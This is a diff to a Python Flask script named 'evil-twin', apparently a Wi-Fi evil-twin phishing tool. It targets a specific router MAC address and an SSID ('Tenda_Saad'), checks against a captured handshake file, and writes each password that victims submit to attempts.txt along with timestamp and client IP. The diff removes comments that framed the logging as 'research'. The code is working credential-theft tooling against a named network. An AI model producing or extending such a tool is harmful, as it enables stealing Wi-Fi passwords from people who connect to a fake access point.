@@ -3,12 +3,10 @@ from subprocess import run, PIPE
 import time, os
 from datetime import datetime
 
-# Configuration - will be updated by main script
-target = 'D8:29:18:E2:B8:D0'
-ssid_name = 'Saad'
-handshake_file = 'Saad.cap'
+target = 'CC:2D:21:61:71:58'
+ssid_name = 'Tenda_Saad'
+handshake_file = 'Tenda_Saad.cap'
 
-# Enhanced validation
 if len(target) != 17:
     print('[ERROR] Invalid target MAC address format')
     exit(1)
@@ -18,7 +16,6 @@ if not os.path.exists(handshake_file):
 
 app = Flask('evil-twin')
 
-# Research logging setup
 logpass = open('attempts.txt', 'a')
 print('[INFO] All attempts will be saved in attempts.txt with timestamps and SSID info')
 
@@ -51,7 +48,6 @@ def hello_world():
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     client_ip = request.remote_addr
     
-    # Enhanced research logging with timestamp and SSID
     log_entry = f"{timestamp} | SSID: {ssid_name} | Password: {passw} | IP: {client_ip}"
     print(log_entry, file=logpass)
     logpass.flush()
